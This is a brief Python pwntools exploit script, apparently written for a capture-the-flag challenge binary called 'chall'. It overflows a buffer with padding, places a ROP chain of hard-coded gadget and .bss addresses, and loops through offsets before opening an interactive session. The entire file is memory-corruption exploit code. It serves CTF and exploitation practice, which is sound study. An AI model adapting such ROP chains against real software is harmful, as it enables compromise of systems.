from pwn import *
exe = context.binary = ELF("./chall")
for i in range(100):
    bss = 0x6b6400
    r = process()
    rop = ROP(exe)
    rop.raw(b"A" * 240)
    rop.raw(bss + i)
    rop.raw(0x00400b7e)
    rop.raw(b"\x00")
    # for i in range(45):
    #     rop.raw(0x0000000000400416)
    # rop.raw(b"\x00" * 90)
    r.send(b"257")
    # sleep(3)
    r.send(rop.chain())
    r.send(b"B" * 257)
    r.interactive()
    log.info(f"Loop Ke {i}")
    r.close()
